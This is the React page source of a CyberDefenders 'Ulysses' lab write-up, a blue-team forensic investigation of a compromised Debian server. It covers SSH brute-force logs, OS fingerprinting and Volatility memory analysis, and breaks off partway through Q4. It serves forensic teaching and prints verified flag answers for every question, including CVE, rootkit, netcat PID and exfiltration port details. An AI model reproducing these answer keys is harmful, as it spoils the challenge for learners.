"use client";

import { useState, useEffect } from "react";
import Image from "next/image";
import Link from "next/link";
import Navbar from "@/components/Navbar";
import CopyButton from "@/components/CopyButton";

export default function UlyssesLabWriteup() {
  const [activeOpId, setActiveOpId] = useState("theory-disk-vs-mem");

  const operations = [
    {
        "id": "part-theory",
        "num": "00",
        "title": "Forensic Theory & Linux Memory Demystified",
        "badge": "CORE DFIR CONCEPTS",
        "tag": "THEORY",
        "questions": [
            {
                "id": "theory-disk-vs-mem",
                "num": "00A",
                "short": "Disk vs Memory Rule",
                "tag": "RULE"
            },
            {
                "id": "theory-volatility",
                "num": "00B",
                "short": "Volatility Linux Profiles",
                "tag": "VOL"
            }
        ]
    },
    {
        "id": "part-initial",
        "num": "01",
        "title": "Reconnaissance & Initial Access",
        "badge": "4 QUESTIONS",
        "tag": "RECON/AUTH",
        "questions": [
            {
                "id": "q1",
                "num": "01",
                "short": "Brute Force Account",
                "tag": "SSH",
                "ans": "ulysses"
            },
            {
                "id": "q2",
                "num": "02",
                "short": "Failed Login Count",
                "tag": "AUTH",
                "ans": "32"
            },
            {
                "id": "q3",
                "num": "03",
                "short": "Target Server OS",
                "tag": "OS",
                "ans": "Debian GNU/Linux 5.0"
            },
            {
                "id": "q4",
                "num": "04",
                "short": "Victim Host IP",
                "tag": "DHCP",
                "ans": "192.168.56.102"
            }
        ]
    },
    {
        "id": "part-exploit",
        "num": "02",
        "title": "Remote Service Exploitation (Exim4)",
        "badge": "3 QUESTIONS",
        "tag": "EXPLOIT/RCE",
        "questions": [
            {
                "id": "q5",
                "num": "05",
                "short": "Attacker Two IPs",
                "tag": "C2",
                "ans": "192.168.56.1, 192.168.56.101"
            },
            {
                "id": "q7",
                "num": "07",
                "short": "Exploited Service",
                "tag": "SVC",
                "ans": "exim4"
            },
            {
                "id": "q8",
                "num": "08",
                "short": "Mail Server CVE",
                "tag": "CVE",
                "ans": "CVE-2010-4344"
            }
        ]
    },
    {
        "id": "part-post",
        "num": "03",
        "title": "Persistence, Rootkit & Exfiltration",
        "badge": "4 QUESTIONS",
        "tag": "ROOTKIT/EXFIL",
        "questions": [
            {
                "id": "q9",
                "num": "09",
                "short": "Compressed Rootkit",
                "tag": "TAR",
                "ans": "rk.tar"
            },
            {
                "id": "q6",
                "num": "06",
                "short": "Malicious Netcat PID",
                "tag": "PID",
                "ans": "2169"
            },
            {
                "id": "q10",
                "num": "10",
                "short": "Data Exfiltration Port",
                "tag": "PORT",
                "ans": "8888"
            },
            {
                "id": "q11",
                "num": "11",
                "short": "Firewall Blocked Port",
                "tag": "FW",
                "ans": "45295"
            }
        ]
    },
    {
        "id": "part-lifecycle",
        "num": "04",
        "title": "End-to-End Attack Lifecycle & Kill Chain",
        "badge": "INCIDENT MAP",
        "tag": "SUMMARY",
        "questions": [
            {
                "id": "timeline-map",
                "num": "12",
                "short": "Kill Chain Architecture",
                "tag": "MAP"
            }
        ]
    }
];

  const allSectionIds = ["theory-disk-vs-mem", "theory-volatility", "q1", "q2", "q3", "q4", "q5", "q7", "q8", "q9", "q6", "q10", "q11", "timeline-map"];

  useEffect(() => {
    const handleScroll = () => {
      const scrollPosition = window.scrollY + 200;
      for (let i = allSectionIds.length - 1; i >= 0; i--) {
        const el = document.getElementById(allSectionIds[i]);
        if (el) {
          const top = el.offsetTop;
          if (top <= scrollPosition) {
            setActiveOpId(allSectionIds[i]);
            break;
          }
        }
      }
    };

    window.addEventListener("scroll", handleScroll, { passive: true });
    handleScroll();
    return () => window.removeEventListener("scroll", handleScroll);
  }, []);

  const scrollToElement = (id) => {
    const element = document.getElementById(id);
    if (element) {
      element.scrollIntoView({ behavior: "smooth", block: "start" });
    }
  };

  return (
    <div className="flex flex-col min-h-screen relative z-10 text-zinc-200 selection:bg-emerald-500/30 selection:text-emerald-200">
      <Navbar />

      <main className="flex-grow pt-6 pb-20">
        <div className="max-w-7xl mx-auto px-4 sm:px-6">
          
          {/* Breadcrumbs */}
          <div className="mb-6 flex flex-wrap items-center gap-2 text-xs font-mono text-zinc-400">
            <Link href="/labs" className="hover:text-emerald-400 transition-colors">
              THREAT LABS
            </Link>
            <span className="text-zinc-600">/</span>
            <Link href="/labs/cyberdefenders" className="hover:text-emerald-400 transition-colors">
              CYBERDEFENDERS
            </Link>
            <span className="text-zinc-600">/</span>
            <span className="text-emerald-400 uppercase">ULYSSES LAB</span>
          </div>

          {/* Banner Graphic */}
          <div className="mb-8 rounded-2xl overflow-hidden border border-zinc-800 shadow-2xl bg-black/60 max-w-4xl mx-auto">
            <Image
              src="/images/cyberdefenders/ulysses_banner.png"
              alt="CyberDefenders Ulysses Lab Trojan Horse Banner"
              width={1200}
              height={630}
              priority
              className="w-full h-auto object-cover"
            />
          </div>

          {/* Header */}
          <div className="mb-8 border-b border-zinc-800 pb-8 max-w-4xl mx-auto">
            <div className="flex flex-wrap items-center gap-2 mb-3">
              <span className="px-2.5 py-1 rounded bg-emerald-950/50 text-emerald-400 border border-emerald-800/50 text-xs font-mono font-bold">
                CyberDefenders • Blue Team Lab #41
              </span>
              <span className="px-2.5 py-1 rounded bg-zinc-900 text-zinc-400 border border-zinc-800 text-xs font-mono">
                Linux Endpoint Forensics
              </span>
              <span className="px-2.5 py-1 rounded bg-blue-950/40 text-blue-400 border border-blue-800/40 text-xs font-mono">
                Volatility Memory Analysis
              </span>
              <span className="px-2.5 py-1 rounded bg-rose-950/40 text-rose-400 border border-rose-800/40 text-xs font-mono">
                Rootkit & C2 Exfiltration
              </span>
            </div>

            <h1 className="text-2xl sm:text-4xl font-extrabold text-white font-[family-name:var(--font-silkscreen)] tracking-wide mb-4">
              CyberDefenders — Ulysses Lab Writeup
            </h1>
            <p className="text-zinc-400 text-sm sm:text-base font-sans leading-relaxed">
              Deep-dive investigation of a compromised Debian server. Covering the complete intrusion lifecycle: SSH brute force detection, Exim4 remote code execution (CVE-2010-4344), trojaned Linux rootkit unpacking, volatile memory analysis with custom Volatility kernel profiles, and raw disk/RAM exfiltration streams.
            </p>

            {/* Key Forensic Indicators Box */}
            <div className="mt-6 p-4 rounded-xl bg-[#0a0a0f] border border-zinc-800">
              <span className="text-xs font-mono uppercase text-zinc-400 font-bold block mb-2">
                Key Intrusion Artifacts Identified:
              </span>
              <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-2.5 font-mono text-xs">
                <div className="bg-zinc-900/80 p-2.5 rounded border border-zinc-800">
                  <span className="text-zinc-500 block text-[10px] uppercase">Victim Host</span>
                  <span className="text-white font-bold">192.168.56.102</span>
                  <span className="text-zinc-400 block text-[10px]">Debian GNU/Linux 5.0</span>
                </div>
                <div className="bg-zinc-900/80 p-2.5 rounded border border-zinc-800">
                  <span className="text-red-400/80 block text-[10px] uppercase">Exploit Delivery IP</span>
                  <span className="text-red-300 font-bold">192.168.56.101</span>
                  <span className="text-zinc-400 block text-[10px]">Exim4 CVE-2010-4344</span>
                </div>
                <div className="bg-zinc-900/80 p-2.5 rounded border border-zinc-800">
                  <span className="text-amber-400/80 block text-[10px] uppercase">Staging / C2 / Exfil</span>
                  <span className="text-amber-300 font-bold">192.168.56.1</span>
                  <span className="text-zinc-400 block text-[10px]">Ports: 4444, 8888</span>
                </div>
                <div className="bg-zinc-900/80 p-2.5 rounded border border-zinc-800">
                  <span className="text-emerald-400/80 block text-[10px] uppercase">Targeted User</span>
                  <span className="text-emerald-300 font-bold">ulysses</span>
                  <span className="text-zinc-400 block text-[10px]">32 Failed SSH Logins</span>
                </div>
              </div>
            </div>
          </div>

          {/* Download Artifact Box & Reference Box */}
          <div className="max-w-4xl mx-auto mb-10 space-y-3">
            <div className="bg-gradient-to-r from-emerald-950/30 to-[#0e0e13] border border-emerald-500/30 rounded-2xl p-5 sm:p-6 shadow-lg">
              <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
                <div>
                  <span className="text-xs font-mono uppercase text-emerald-400 tracking-wider font-bold">
                    Challenge Artifact
                  </span>
                  <h3 className="text-lg font-bold text-white font-[family-name:var(--font-share-tech)] mt-1">
                    41-Ulysses.zip (436 MB)
                  </h3>
                  <p className="text-xs text-zinc-400 mt-1 font-mono">
                    Source: <code className="text-zinc-300 bg-black/50 px-1 py-0.5 rounded">C:\CTFS\CyberDefenders\Ulysses Lab</code> (contains <code className="text-zinc-300">victoria-v8.sda1.img</code>, <code className="text-zinc-300">victoria-v8.memdump.img</code>, and <code className="text-zinc-300">Debian5_26.zip</code>)
                  </p>
                </div>
                <a
                  href="https://cyberdefenders.org/blueteam-ctf-challenges/ulysses/"
                  target="_blank"
                  rel="noopener noreferrer"
                  className="inline-flex items-center gap-2 px-5 py-2.5 rounded-xl bg-emerald-500 hover:bg-emerald-400 text-black font-mono font-bold text-xs transition-all duration-300 shadow-md hover:shadow-emerald-500/25 shrink-0"
                >
                  <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2.5" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
                  </svg>
                  Get Lab on CyberDefenders
                </a>
              </div>
            </div>
          </div>

          {/* Mobile Operations Index Bar */}
          <div className="lg:hidden mb-8 p-3 rounded-xl bg-[#0a0a0f] border border-zinc-800 overflow-x-auto">
            <span className="text-[10px] font-mono uppercase text-zinc-500 block mb-2 font-bold px-1">
              Operations Index
            </span>
            <div className="flex gap-2 min-w-max">
              {operations.map((op) => (
                <button
                  key={op.id}
                  onClick={() => scrollToElement(op.id)}
                  className="px-3 py-1.5 rounded-lg text-xs font-mono transition-colors flex items-center gap-1.5 bg-zinc-900 text-zinc-400 border border-zinc-800 hover:text-white"
                >
                  <span>{op.num}.</span>
                  <span>{op.title}</span>
                </button>
              ))}
            </div>
          </div>

          {/* Content Section with Sticky Sidebar */}
          <div className="grid grid-cols-1 lg:grid-cols-4 gap-8">
            
            {/* Sidebar Navigation */}
            <div className="hidden lg:block lg:col-span-1">
              <div className="sticky top-24 bg-[#0a0a0f]/90 border border-zinc-800/80 rounded-2xl p-4 backdrop-blur-xl max-h-[calc(100vh-8rem)] overflow-y-auto space-y-4 font-mono text-xs shadow-xl">
                <div className="text-[11px] uppercase tracking-wider text-zinc-400 font-bold px-2 pb-2 border-b border-zinc-800 flex items-center justify-between">
                  <span>Operations Index</span>
                  <span className="text-[10px] text-emerald-400 font-bold">11 Questions</span>
                </div>

                {operations.map((op) => (
                  <div key={op.id} className="space-y-1.5 pt-2 first:pt-0">
                    <div className="px-2 py-1 text-[11px] font-bold text-white bg-zinc-900/60 rounded border border-zinc-800/80 flex items-center justify-between">
                      <span className="truncate">{op.num}. {op.title}</span>
                      <span className="text-[9px] text-emerald-400 shrink-0 ml-1">{op.tag}</span>
                    </div>
                    <div className="pl-2 space-y-0.5 border-l border-zinc-800 ml-2">
                      {op.questions.map((q) => (
                        <button
                          key={q.id}
                          onClick={() => scrollToElement(q.id)}
                          className={`w-full text-left px-2 py-1 rounded transition-colors flex items-center justify-between text-[11px] ${
                            activeOpId === q.id
                              ? "bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 font-bold"
                              : "text-zinc-400 hover:text-white hover:bg-zinc-800/50"
                          }`}
                        >
                          <span className="truncate">{q.num}. {q.short}</span>
                          <span className="text-[9px] text-zinc-500 shrink-0 ml-1">{q.tag}</span>
                        </button>
                      ))}
                    </div>
                  </div>
                ))}
              </div>
            </div>

            {/* Main Content Area */}
            <div className="lg:col-span-3 space-y-12">
              {/* Theory Section */}
              <div id="part-theory" className="scroll-mt-24 p-6 sm:p-8 rounded-3xl bg-gradient-to-r from-zinc-900/90 via-[#0e0e14] to-zinc-900/80 border border-zinc-700/60 shadow-xl space-y-6">
                <div>
                  <span className="px-3 py-1 rounded bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 font-mono text-xs font-bold uppercase tracking-wider">
                    Foundational Forensics
                  </span>
                  <h2 className="text-xl sm:text-2xl font-bold text-white font-[family-name:var(--font-silkscreen)] tracking-wide mt-2">
                    Forensic Theory & Memory Demystified
                  </h2>
                </div>

                {/* 00A: Disk vs Memory */}
                <div id="theory-disk-vs-mem" className="scroll-mt-28 space-y-3 pt-2 border-t border-zinc-800">
                  <h3 className="text-lg font-bold text-white font-[family-name:var(--font-share-tech)]">
                    The Disk vs Memory Golden Rule
                  </h3>
                  <p className="text-sm text-zinc-300 leading-relaxed font-sans">
                    In this investigation you are provided with two distinct forms of digital evidence: a raw disk image (<code>victoria-v8.sda1.img</code>) and volatile memory dumps (<code>victoria-v8.memdump.img</code>). Knowing which evidence source answers which question is fundamental:
                  </p>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4 pt-2 font-mono text-xs">
                    <div className="p-4 rounded-xl bg-black/50 border border-zinc-800">
                      <span className="text-emerald-400 font-bold block mb-1">Disk Image (Historical Truth)</span>
                      <p className="text-zinc-400 font-sans text-xs">Contains persistent data written to non-volatile storage over time. Use for checking authentication logs (<code>/var/log/auth.log</code>), mail server histories, package manager records, dropped files, and startup configs.</p>
                    </div>
                    <div className="p-4 rounded-xl bg-black/50 border border-zinc-800">
                      <span className="text-purple-400 font-bold block mb-1">Memory Dump (Live Volatile State)</span>
                      <p className="text-zinc-400 font-sans text-xs">Captures the instantaneous state of RAM at acquisition time. Essential for uncovering active rootkits, unlinked/hidden processes (e.g. Netcat PID 2169), open network sockets, and payloads that never touch disk.</p>
                    </div>
                  </div>
                </div>

                {/* 00B: Volatility Linux Profiles */}
                <div id="theory-volatility" className="scroll-mt-28 space-y-3 pt-4 border-t border-zinc-800">
                  <h3 className="text-lg font-bold text-white font-[family-name:var(--font-share-tech)]">
                    Why Linux Memory Analysis Requires Custom Profiles
                  </h3>
                  <p className="text-sm text-zinc-300 leading-relaxed font-sans">
                    Unlike Windows where kernel structures (like <code>_EPROCESS</code>) maintain general consistency across service packs, Linux is modular and open-source. Every distribution compiles its kernel with unique compiler flags, struct alignments, and memory layout configurations. Volatility requires a tailored profile containing:
                  </p>
                  <ul className="list-disc pl-5 text-xs font-mono text-zinc-300 space-y-1">
                    <li><code>module.dwarf</code>: Defines the exact C-struct definitions of the running kernel.</li>
                    <li><code>System.map</code>: Maps kernel symbol names directly to their runtime memory addresses.</li>
                  </ul>
                  <p className="text-xs text-zinc-400 font-sans">
                    The challenge provides <code>Debian5_26.zip</code>, acting as the translation dictionary that enables Volatility to parse Debian 5 (kernel 2.6.26-2-686) memory structures seamlessly.
                  </p>
                </div>
              </div>

              {/* Operation Banner: Reconnaissance & Initial Access */}
              <div id="part-initial" className="scroll-mt-24 p-6 rounded-3xl bg-gradient-to-r from-zinc-900/90 via-[#0e0e14] to-zinc-900/80 border border-zinc-700/60 shadow-xl space-y-2">
                <div className="flex flex-wrap items-center justify-between gap-2">
                  <span className="px-3 py-1 rounded bg-emerald-500/20 text-emerald-300 border border-emerald-500/30 font-mono text-xs font-bold uppercase tracking-wider">
                    Phase 01 • RECON/AUTH
                  </span>
                  <span className="text-xs font-mono text-zinc-400">
                    4 QUESTIONS
                  </span>
                </div>
                <h2 className="text-xl sm:text-2xl font-bold text-white font-[family-name:var(--font-silkscreen)] tracking-wide">
                  Reconnaissance & Initial Access
                </h2>
              </div>

              {/* Question 01 */}
              <section id="q1" className="scroll-mt-24 p-6 sm:p-8 rounded-3xl bg-[#0a0a0f]/90 border border-zinc-800/80 shadow-2xl space-y-6">
                <div className="border-b border-zinc-800/80 pb-4">
                  <div className="flex flex-wrap items-center justify-between gap-2 mb-2">
                    <span className="bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 font-mono text-xs px-2.5 py-0.5 rounded font-bold uppercase">
                      Q01 • SSH
                    </span>
                    <span className="text-xs font-mono text-zinc-500">
                      Evidence: victoria-v8.sda1.img -> /var/log/auth.log
                    </span>
                  </div>
                  <h3 className="text-lg sm:text-xl font-bold text-white font-[family-name:var(--font-share-tech)] leading-snug">
                    Q1: The attacker was performing a Brute Force attack. What account triggered the alert?
                  </h3>
                </div>

                <p className="text-zinc-300 text-sm leading-relaxed font-sans" dangerouslySetInnerHTML={{ __html: "When an analyst investigates a brute-force alert on a Linux host, the primary evidence source is the authentication log (<code>/var/log/auth.log</code> on Debian/Ubuntu, or <code>/var/log/secure</code> on RHEL/CentOS)." }} />

                {/* Investigation Walkthrough Steps */}
                <div className="text-zinc-300 text-sm leading-relaxed space-y-2.5 font-sans">
                  <p dangerouslySetInnerHTML={{ __html: "Open the disk image <code>victoria-v8.sda1.img</code> using <strong>7-Zip</strong> or <strong>FTK Imager</strong> (no heavy toolchain required)." }} />
                  <p dangerouslySetInnerHTML={{ __html: "Navigate into <code>var \u2794 log</code> and extract/view <code>auth.log</code>." }} />
                  <p dangerouslySetInnerHTML={{ __html: "Scroll to the incident window on Feb 6 (lines 45 to 105). You will observe hundreds of rapid SSH authentication failures arriving from <code>192.168.56.1</code>." }} />
                  <p dangerouslySetInnerHTML={{ __html: "Each failed line explicitly targets user <code>ulysses</code>: <code>Failed password for invalid user ulysses from 192.168.56.1 port 34431 ssh2</code>." }} />
                  <p dangerouslySetInnerHTML={{ __html: "The 7-letter username <code>ulysses</code> matches the CTF format pattern <code>*******</code>." }} />
                </div>

                {/* Command / Evidence Snippet */}
                <div className="rounded-xl overflow-hidden border border-zinc-800 bg-[#0d0d12]">
                  <div className="px-4 py-2 border-b border-zinc-800 bg-zinc-900/60 flex items-center justify-between text-xs font-mono">
                    <span className="text-zinc-400 font-bold uppercase tracking-wider text-[11px]">
                      Forensic Evidence Extract
                    </span>
                    <CopyButton text={"Feb  6 15:16:20 victoria sshd[2085]: Invalid user ulysses from 192.168.56.1\nFeb  6 15:16:20 victoria sshd[2085]: Failed none for invalid user ulysses from 192.168.56.1 port 34431 ssh2\nFeb  6 15:16:26 victoria sshd[2085]: Failed password for invalid user ulysses from 192.168.56.1 port 34431 ssh2\nFeb  6 15:16:32 victoria sshd[2085]: Failed password for invalid user ulysses from 192.168.56.1 port 34431 ssh2\nFeb  6 15:16:40 victoria sshd[2085]: Failed password for invalid user ulysses from 192.168.56.1 port 34431 ssh2"} />
                  </div>
                  <pre className="p-3 sm:p-4 font-mono text-xs text-emerald-300 bg-black/40 overflow-x-auto leading-relaxed">
                    <code>{"Feb  6 15:16:20 victoria sshd[2085]: Invalid user ulysses from 192.168.56.1\nFeb  6 15:16:20 victoria sshd[2085]: Failed none for invalid user ulysses from 192.168.56.1 port 34431 ssh2\nFeb  6 15:16:26 victoria sshd[2085]: Failed password for invalid user ulysses from 192.168.56.1 port 34431 ssh2\nFeb  6 15:16:32 victoria sshd[2085]: Failed password for invalid user ulysses from 192.168.56.1 port 34431 ssh2\nFeb  6 15:16:40 victoria sshd[2085]: Failed password for invalid user ulysses from 192.168.56.1 port 34431 ssh2"}</code>
                  </pre>
                </div>

                {/* Screenshot */}
                <div className="my-4 rounded-xl overflow-hidden border border-zinc-800 shadow-xl bg-black/50">
                  <Image
                    src="/images/cyberdefenders/ulysses/Pasted_image_20261104092437.png"
                    alt={"Ulysses forensic investigation screenshot for The attacker was performing a Brute Force attack. What account triggered the alert?"}
                    width={1100}
                    height={600}
                    className="w-full h-auto object-contain"
                  />
                </div>

                {/* Answer Box */}
                <div className="mt-6 p-4 rounded-xl bg-gradient-to-r from-emerald-950/40 to-[#0c0c12] border border-emerald-500/40 flex flex-col sm:flex-row sm:items-center justify-between gap-3 shadow-lg">
                  <div>
                    <span className="text-[10px] font-mono uppercase tracking-wider text-emerald-400 block font-bold">
                      Verified Flag / Answer:
                    </span>
                    <span className="font-mono text-base font-bold text-white tracking-wide break-all">
                      ulysses
                    </span>
                  </div>
                  <CopyButton text={"ulysses"} />
                </div>
              </section>

              {/* Question 02 */}
              <section id="q2" className="scroll-mt-24 p-6 sm:p-8 rounded-3xl bg-[#0a0a0f]/90 border border-zinc-800/80 shadow-2xl space-y-6">
                <div className="border-b border-zinc-800/80 pb-4">
                  <div className="flex flex-wrap items-center justify-between gap-2 mb-2">
                    <span className="bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 font-mono text-xs px-2.5 py-0.5 rounded font-bold uppercase">
                      Q02 • AUTH
                    </span>
                    <span className="text-xs font-mono text-zinc-500">
                      Evidence: victoria-v8.sda1.img -> /var/log/auth.log
                    </span>
                  </div>
                  <h3 className="text-lg sm:text-xl font-bold text-white font-[family-name:var(--font-share-tech)] leading-snug">
                    Q2: How many failed login attempts were alerted for the same user?
                  </h3>
                </div>

                <p className="text-zinc-300 text-sm leading-relaxed font-sans" dangerouslySetInnerHTML={{ __html: "Scoping the brute-force attempt requires isolating events targeting the specific account while filtering out irrelevant background noise." }} />

                {/* Investigation Walkthrough Steps */}
                <div className="text-zinc-300 text-sm leading-relaxed space-y-2.5 font-sans">
                  <p dangerouslySetInnerHTML={{ __html: "<strong>The Trap:</strong> Running a naive search like <code>grep -i \"failed\" auth.log | wc -l</code> returns <strong>33</strong>. Looking closely at line 18 reveals an unrelated local console failure weeks earlier: <code>Jan 18 17:13:31 victoria login[1995]: FAILED LOGIN (1) on 'tty1' FOR `root`</code>." }} />
                  <p dangerouslySetInnerHTML={{ __html: "<strong>Targeted Filter:</strong> Grep specifically for failures tied to the targeted account: <code>grep -i \"failed\" auth.log | grep -i \"ulysses\" | wc -l</code> \u2794 Exactly <strong>32</strong>." }} />
                  <p dangerouslySetInnerHTML={{ __html: "<strong>Anatomy of the 32 Attempts:</strong>" }} />
                  <p dangerouslySetInnerHTML={{ __html: "\u2022 <strong>8 \u00d7 <code>Failed none for invalid user ulysses</code></strong>: RFC 4252 initial SSH handshake probes sent by automated scanning tools (Hydra/Medusa) to query server-supported auth methods." }} />
                  <p dangerouslySetInnerHTML={{ __html: "\u2022 <strong>24 \u00d7 <code>Failed password for invalid user ulysses</code></strong>: Actual credential guesses from the attacker wordlist rejected by PAM." }} />
                  <p dangerouslySetInnerHTML={{ __html: "\u2022 Total: 8 + 24 = <strong>32</strong> failed login attempts." }} />
                </div>

                {/* Command / Evidence Snippet */}
                <div className="rounded-xl overflow-hidden border border-zinc-800 bg-[#0d0d12]">
                  <div className="px-4 py-2 border-b border-zinc-800 bg-zinc-900/60 flex items-center justify-between text-xs font-mono">
                    <span className="text-zinc-400 font-bold uppercase tracking-wider text-[11px]">
                      Forensic Evidence Extract
                    </span>
                    <CopyButton text={"# Fast command-line count:\ngrep -i \"failed\" auth.log | grep -i \"ulysses\" | wc -l\n# Output: 32\n\n# Notepad++ GUI method:\n# Find what: Failed.*ulysses (Regular expression) -> Click Count -> Result: 32 matches"} />
                  </div>
                  <pre className="p-3 sm:p-4 font-mono text-xs text-emerald-300 bg-black/40 overflow-x-auto leading-relaxed">
                    <code>{"# Fast command-line count:\ngrep -i \"failed\" auth.log | grep -i \"ulysses\" | wc -l\n# Output: 32\n\n# Notepad++ GUI method:\n# Find what: Failed.*ulysses (Regular expression) -> Click Count -> Result: 32 matches"}</code>
                  </pre>
                </div>

                {/* Answer Box */}
                <div className="mt-6 p-4 rounded-xl bg-gradient-to-r from-emerald-950/40 to-[#0c0c12] border border-emerald-500/40 flex flex-col sm:flex-row sm:items-center justify-between gap-3 shadow-lg">
                  <div>
                    <span className="text-[10px] font-mono uppercase tracking-wider text-emerald-400 block font-bold">
                      Verified Flag / Answer:
                    </span>
                    <span className="font-mono text-base font-bold text-white tracking-wide break-all">
                      32
                    </span>
                  </div>
                  <CopyButton text={"32"} />
                </div>
              </section>

              {/* Question 03 */}
              <section id="q3" className="scroll-mt-24 p-6 sm:p-8 rounded-3xl bg-[#0a0a0f]/90 border border-zinc-800/80 shadow-2xl space-y-6">
                <div className="border-b border-zinc-800/80 pb-4">
                  <div className="flex flex-wrap items-center justify-between gap-2 mb-2">
                    <span className="bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 font-mono text-xs px-2.5 py-0.5 rounded font-bold uppercase">
                      Q03 • OS
                    </span>
                    <span className="text-xs font-mono text-zinc-500">
                      Evidence: victoria-v8.sda1.img -> /etc/issue.net & /etc/debian_version
                    </span>
                  </div>
                  <h3 className="text-lg sm:text-xl font-bold text-white font-[family-name:var(--font-share-tech)] leading-snug">
                    Q3: What kind of system runs on the targeted server?
                  </h3>
                </div>

                <p className="text-zinc-300 text-sm leading-relaxed font-sans" dangerouslySetInnerHTML={{ __html: "Fingerprinting the exact operating system release determines which exploits could be viable and tells the forensic team which Volatility profile to construct." }} />

                {/* Investigation Walkthrough Steps */}
                <div className="text-zinc-300 text-sm leading-relaxed space-y-2.5 font-sans">
                  <p dangerouslySetInnerHTML={{ __html: "In Linux, OS identification banners reside under <code>/etc/</code>." }} />
                  <p dangerouslySetInnerHTML={{ __html: "Open <code>victoria-v8.sda1.img</code> in 7-Zip or FTK Imager and navigate into <code>etc/</code>." }} />
                  <p dangerouslySetInnerHTML={{ __html: "Inspect <code>/etc/issue.net</code> (the network pre-login banner sent over Telnet/SSH): It reads <code>Debian GNU/Linux 5.0</code>." }} />
                  <p dangerouslySetInnerHTML={{ __html: "Cross-check <code>/etc/debian_version</code>: Displays point release <code>5.0.7</code>." }} />
                  <p dangerouslySetInnerHTML={{ __html: "This matches the provided Volatility Linux profile archive: <code>Debian5_26.zip</code> (Debian 5 with 2.6.x kernel)." }} />
                </div>

                {/* Command / Evidence Snippet */}
                <div className="rounded-xl overflow-hidden border border-zinc-800 bg-[#0d0d12]">
                  <div className="px-4 py-2 border-b border-zinc-800 bg-zinc-900/60 flex items-center justify-between text-xs font-mono">
                    <span className="text-zinc-400 font-bold uppercase tracking-wider text-[11px]">
                      Forensic Evidence Extract
                    </span>
                    <CopyButton text={"$ cat /etc/issue.net\nDebian GNU/Linux 5.0\n\n$ cat /etc/debian_version\n5.0.7"} />
                  </div>
                  <pre className="p-3 sm:p-4 font-mono text-xs text-emerald-300 bg-black/40 overflow-x-auto leading-relaxed">
                    <code>{"$ cat /etc/issue.net\nDebian GNU/Linux 5.0\n\n$ cat /etc/debian_version\n5.0.7"}</code>
                  </pre>
                </div>

                {/* Screenshot */}
                <div className="my-4 rounded-xl overflow-hidden border border-zinc-800 shadow-xl bg-black/50">
                  <Image
                    src="/images/cyberdefenders/ulysses/Pasted_image_20261104093749.png"
                    alt={"Ulysses forensic investigation screenshot for What kind of system runs on the targeted server?"}
                    width={1100}
                    height={600}
                    className="w-full h-auto object-contain"
                  />
                </div>

                {/* Screenshot */}
                <div className="my-4 rounded-xl overflow-hidden border border-zinc-800 shadow-xl bg-black/50">
                  <Image
                    src="/images/cyberdefenders/ulysses/Pasted_image_20261104093809.png"
                    alt={"Ulysses forensic investigation screenshot for What kind of system runs on the targeted server?"}
                    width={1100}
                    height={600}
                    className="w-full h-auto object-contain"
                  />
                </div>

                {/* Answer Box */}
                <div className="mt-6 p-4 rounded-xl bg-gradient-to-r from-emerald-950/40 to-[#0c0c12] border border-emerald-500/40 flex flex-col sm:flex-row sm:items-center justify-between gap-3 shadow-lg">
                  <div>
                    <span className="text-[10px] font-mono uppercase tracking-wider text-emerald-400 block font-bold">
                      Verified Flag / Answer:
                    </span>
                    <span className="font-mono text-base font-bold text-white tracking-wide break-all">
                      Debian GNU/Linux 5.0
                    </span>
                  </div>
                  <CopyButton text={"Debian GNU/Linux 5.0"} />
                </div>
              </section>

              {/* Question 04 */}
              <section id="q4" className="scroll-mt-24 p-6 sm:p-8 rounded-3xl bg-[#0a0a0f]/90 border border-zinc-800/80 shadow-2xl space-y-6">
                <div className="border-b border-zinc-800/80 pb-4">
                  <div className="flex flex-wrap items-center justify-between gap-2 mb-2">
                    <span className="bg-emerald-500/10 text-emerald-400 border border-emerald-500/30 font-mono text-xs px-2.5 py-0.5 rounded font-bold uppercase">
                      Q04 • DHCP
                    </span>
                    <span className="text-xs font-mono text-zinc-500">
                      Evidence: victoria-v8.sda1.img -> /var/log/daemon.log (or Volatility linux_ifconfig)
                    </span>
                  </div>
                  <h3 className="text-lg sm:text-xl font-bold text-white font-[family-name:var(--font-share-tech)] leading-snug">
                    Q4: What is the victim's IP address?
                  </h3>
                </div>

                <p className="text-zinc-300 text-sm leading-relaxed font-sans" dangerouslySetInnerHTML={{ __html: "Determining the target victim's assigned IP address can be accomplished via disk logs or volatile memory structures." }} />

                {/* Investigation Walkthrough Steps */}
                <div className="text-zinc-300 text-sm leading-relaxed space-y-2.5 font-sans">
                  <p dangerouslySetInnerHTML={{ __html: "<strong>Method 1 \u2014 Disk Inspection (/var/log/daemon.log):</strong>" }} />
                  <p dangerouslySetInnerHTML={{ __html: "Checking <code>/etc/network/interfaces</code> shows <code>iface eth0 inet dhcp</code>, confirming the IP was allocated dynamically via DHCP." }} />
                  <p dangerouslySetInnerHTML={{ __html: "Open <code>/var/log/daemon.log</code> in 7-Zip or FTK Imager and scroll to the bottom during the Feb 6 boot/lease event at 15:10:22:" }} />
                  <p dangerouslySetInnerHTML={{ __html: "<code>Feb  6 15:10:22 victoria dhclient: bound to 192.168.56.102 -- renewal in 1435 seconds.</code>" }} />
                  <p dangerouslySetInnerHTML={{ __html: "<strong>Method 2 \u2014 Memory Forensics (Volatility):</strong>" }} />
                  <p dangerouslySetInnerHTML={{ __html: "Run <code>vol.py -f victoria-v8.memdump.img --profile=LinuxDebian5_26x86 linux_ifconfig</code>: Shows interface <code>eth0</code> configured with IP <code>192.168.56.102</code>." }} />
                </div>

                {/* Command / Evidence Snippet */}
                <div className="rounded-xl overflow-hidden border border-zinc-800 bg-[#0d0d12]">
                  <div className="px-4 py-2 border-b border-zinc-800 bg-zinc-900/60 flex items-center justify-between text-xs font-mono">
                    <span className="text-zinc-400 font-bold uppercase tracking-wider text-[11px]">
                      Forensic Evidence Extract
                    </span>
